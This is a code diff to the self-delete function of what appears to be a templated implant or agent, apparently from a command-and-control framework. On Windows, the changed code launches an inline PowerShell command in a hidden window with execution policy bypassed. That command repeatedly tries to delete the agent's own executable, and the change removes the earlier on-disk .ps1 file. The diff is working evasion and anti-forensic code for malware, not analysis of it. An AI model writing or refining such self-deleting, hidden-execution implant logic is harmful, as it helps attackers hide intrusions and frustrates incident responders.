@@ -1929,39 +1929,28 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 		time.Sleep(100 * time.Millisecond) // Brief delay to ensure process exits
 
 		if runtime.GOOS == "windows" {
-			// Create a PowerShell script to delete the executable after the process exits
-			psScript := fmt.Sprintf(`
-				Start-Sleep -Milliseconds 500
-				$retries = 0
-				$maxRetries = 10
+			psCommand := fmt.Sprintf(`
+				Start-Sleep -Milliseconds 500;
+				$targetPath = '%s';
+				$retries = 0;
+				$maxRetries = 10;
 				while ($retries -lt $maxRetries) {
-					try {
-						Remove-Item -Path "%s" -Force
-						break
-					} catch {
-						Start-Sleep -Milliseconds 500
-						$retries++
+					if (Test-Path $targetPath) {
+						try {
+							Remove-Item -Path $targetPath -Force -ErrorAction Stop;
+							break;
+						} catch {
+							Start-Sleep -Milliseconds 500;
+							$retries++;
+						}
+					} else {
+						break;
 					}
 				}
 			`, executable)
 
-			psFile := executable + ".ps1"
-
-			if err := ioutil.WriteFile(psFile, []byte(psScript), 0644); err != nil {
-				// If we can't create the PowerShell script, try direct deletion
-				os.Remove(executable)
-				os.Exit(0)
-				return
-			}
-
-			// Execute the PowerShell script in a hidden window to delete the file
-			exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psFile).Start()
-
-			// Also try to delete the PS1 file after some time
-			go func() {
-				time.Sleep(2 * time.Second)
-				os.Remove(psFile)
-			}()
+			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
+			cmd.Start()
 		} else {
 			os.Remove(executable)
 		}
